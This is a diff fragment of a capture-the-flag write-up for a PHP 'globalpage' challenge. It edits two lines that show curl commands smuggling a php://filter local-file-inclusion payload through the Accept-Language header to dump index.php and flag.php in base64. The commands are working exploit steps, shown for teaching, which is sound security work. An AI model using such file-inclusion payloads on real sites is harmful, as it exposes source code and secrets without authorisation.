@@ -17,7 +17,7 @@ Every LFI page parameter results in a correctly input sanity check(escape . and 
 
 What can we do? Attach a LFI in the Accept-Language and build the properly LFI.
 
-`pirate$ curl 'http://globalpage.chal.ctf.westerns.tokyo/?page=php:' -H "Accept-Language:/filter/convert.base64-encode/resource=index"` => result in the GET Request `http://globalpage.chal.ctf.westerns.tokyo/?page=php://filter/convert.base64-encode/resource=index` that encode the index.php in base64.
+`pirate$ curl 'http://globalpage.chal.ctf.westerns.tokyo/?page=php:' -H "Accept-Language:/filter/convert.base64-encode/resource=index"` => result in the GET Request `http://globalpage.chal.ctf.westerns.tokyo/?page=php://filter/convert.base64-encode/resource=index.php` that encode the index.php in base64.
 
 Decode the base64 index.php and obtain:
 ```
@@ -76,7 +76,7 @@ else {
 ```
 
 _include "flag.php"_, so one more time LFI:
-`pirate$ curl 'http://globalpage.chal.ctf.westerns.tokyo/?page=php:' -H "Accept-Language:/filter/convert.base64-encode/resource=flag"` => result in the GET Request `http://globalpage.chal.ctf.westerns.tokyo/?page=php://filter/convert.base64-encode/resource=flag`.
+`pirate$ curl 'http://globalpage.chal.ctf.westerns.tokyo/?page=php:' -H "Accept-Language:/filter/convert.base64-encode/resource=flag"` => result in the GET Request `http://globalpage.chal.ctf.westerns.tokyo/?page=php://filter/convert.base64-encode/resource=flag.php`.
 
 Decode base64 and woitlà:
 
